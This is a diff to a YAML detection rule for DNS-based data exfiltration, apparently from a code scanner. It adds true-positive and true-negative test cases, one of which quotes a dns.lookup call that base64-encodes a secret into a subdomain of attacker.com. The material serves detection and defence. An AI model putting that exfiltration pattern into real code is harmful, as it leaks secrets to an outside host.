@@ -69,4 +69,11 @@ remediation: >
   If DNS-based service discovery is required, use a static list of known-good hostnames.
   Never construct DNS query hostnames by concatenating or encoding application data.
   Deploy DNS logging (e.g., passive DNS, BIND query logs) and alert on high-entropy subdomain queries.
+test_cases:
+  true_positive:
+    - { description: "Source code contains dns.lookup(`${Buffer.from(secret).toString('base64')}.attacker.com`) encoding data in subdomain", expected: true }
+    - { description: "Source code contains nslookup with dynamically constructed domain using hex-encoded user data", expected: true }
+  true_negative:
+    - { description: "Source code contains dns.resolve('api.example.com') with a static hardcoded hostname", expected: false }
+    - { description: "Source code performs DNS lookup on localhost for health check purposes", expected: false }
 enabled: true
